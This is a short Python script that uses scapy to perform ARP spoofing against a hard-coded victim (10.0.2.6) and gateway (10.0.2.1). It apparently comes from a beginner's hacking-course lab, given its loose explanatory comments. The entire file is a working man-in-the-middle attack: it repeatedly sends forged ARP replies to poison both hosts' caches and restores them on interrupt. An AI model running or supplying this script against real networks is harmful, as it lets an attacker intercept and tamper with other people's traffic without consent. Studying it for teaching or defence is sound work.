#!/usr/bin/env python
import sys
import time

import scapy.all as scapy


# ARP mean the send call with a ip-address to the router and rcecive the request with the mac address from that particular ip-address.
# we setting the function to redirect the follow and ARP response . we setting the victim ip and MAC address and lastly we add the router mac address because when we connet with the victim and send packet then  victime understand that router ip send this msg

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip)  # op=2 means ARP response and op=1 means ARP request
    scapy.send(packet, verbose=False)
    # print(packet.show())
    # print(packet.summary())


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.2.6"
gateway_ip = "10.0.2.1"

try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count += 2
        # print("\r[+] Packets Sent : " + str(sent_packet_count)), #this function is only use for python2
        # sys.stdout.flush()
        print("\r[+] Packets Sent : " + str(sent_packet_count), end="")  # this function work in python3
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ...............Resetting ARP tables....... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
